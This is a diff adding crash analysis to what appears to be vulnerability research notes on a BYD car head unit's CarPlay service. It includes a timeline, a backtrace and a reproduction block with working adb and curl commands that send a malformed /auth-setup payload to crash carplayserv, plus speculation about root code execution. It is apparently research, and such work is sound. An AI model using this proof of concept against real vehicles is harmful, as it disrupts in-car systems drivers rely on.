@@ -106,3 +106,73 @@ adb shell 'curl -X POST http://127.0.0.1:7000/auth-setup \
 | version 0 + all-zero key | 33 | 000 |
 
 All subsequent tests returned 000 because the crash disrupted the CarPlay session.
+
+## Full Crash Backtrace (captured with live logcat)
+
+### Timeline
+| Time | Event |
+|------|-------|
+| 23:23:35.547 | `[HTTPServer] Accepted connection from 127.0.0.1:41660` |
+| 23:23:35.548 | `[HTTPServer] http connection start, ifName:lo, transportType:1` |
+| 23:23:35.551 | `[HTTPServer] POST /auth-setup HTTP/1.1` (our request) |
+| 23:23:35.551 | `User-Agent: curl/7.64.1` |
+| 23:23:35.551 | `Content-Type: application/octet-stream` |
+| ~35.6-35.8 | **320ms GAP** — carplayserv crashes/restarts (no logcat) |
+| 23:23:35.871 | `[AirPlay] Registering Bonjour _airplay._tcp. port 7000` (NEW PID 30143) |
+| 23:23:36.459 | `Fatal signal 11 (SIGSEGV)` in com.byd.carplay.ui (PID 23267) |
+| 23:23:37.253 | `Tombstone written to: /data/tombstones/tombstone_06` |
+
+### Java App Crash Backtrace
+```
+signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x10
+Cause: null pointer dereference
+
+#00 pc 000000000000fb08  /system/lib64/libutils.so (android::RefBase::~RefBase()+52)
+#01 pc 0000000000188c84  /system/lib64/libcarplayreceiver_jni.so (VideoSink::~VideoSink()+168)
+#02 pc 0000000000188330  /system/lib64/libcarplayreceiver_jni.so (Java_com_byd_carplay_protocol_VideoSink_nativeShutdown+60)
+...
+#10 pc 0000000000265f04  (com.byd.carplay.protocol.VideoSink.destroy)
+#13 pc 000000000026efc8  (com.byd.carplay.video.VideoDecoder.unregisterVideoSink+8)
+```
+
+### Analysis
+1. Our `/auth-setup` POST is received and processed by carplayserv's AirPlay HTTP handler
+2. The auth-setup processing disrupts the active CarPlay session (session conflict)
+3. carplayserv restarts (PID 28366 → 30143) — native crash or forced restart
+4. CarPlay UI app receives binder death notification
+5. VideoSink destructor hits null pointer (x0=0x0000000000000000, fault at x0+0x10)
+6. SIGSEGV in `RefBase::~RefBase()` called from `VideoSink::~VideoSink()`
+
+### Key Registers
+```
+x0  = 0x0000000000000000 (NULL — this is what's dereferenced)
+x1  = 0x0000007a032d6ee0
+pc  = 0x0000007af5e9eb08 (libutils.so + 0xfb08)
+lr  = 0x0000007a03128c88 (libcarplayreceiver_jni.so + 0x188c88)
+```
+
+### Impact
+- **DoS confirmed:** Network request crashes carplayserv + CarPlay UI
+- **Native crash:** carplayserv PID changes (restart evidence)
+- **RCE potential:** If the native carplayserv crash is a memory corruption (not clean exit),
+  it could be escalated to code execution with root privileges
+- **Tombstone:** `/data/tombstones/tombstone_06` — Java crash (not native)
+
+### Discovered: iPhone Protocol Details
+From captured live traffic:
+- iPhone uses **RTSP/1.0** (not HTTP/1.1) for AirPlay requests
+- iPhone User-Agent: `AirPlay/980.63.2` (much newer than car's 450.14)
+- iPhone sends to `/feedback` with `CSeq` header (RTSP sequence number)
+- carplayserv accepts BOTH HTTP/1.1 and RTSP/1.0 requests
+
+### Reproduction
+```bash
+# Requires active CarPlay session (iPhone connected via USB)
+python3 -c "import os; open('/tmp/auth.bin','wb').write(b'\x00'+os.urandom(32))"
+adb push /tmp/auth.bin /data/local/tmp/auth.bin
+adb forward tcp:7000 tcp:7000
+adb shell 'curl -X POST http://127.0.0.1:7000/auth-setup \
+  -H "Content-Type: application/octet-stream" \
+  --data-binary @/data/local/tmp/auth.bin --max-time 5'
+# carplayserv crashes, CarPlay UI SIGSEGV, session disrupted
+```
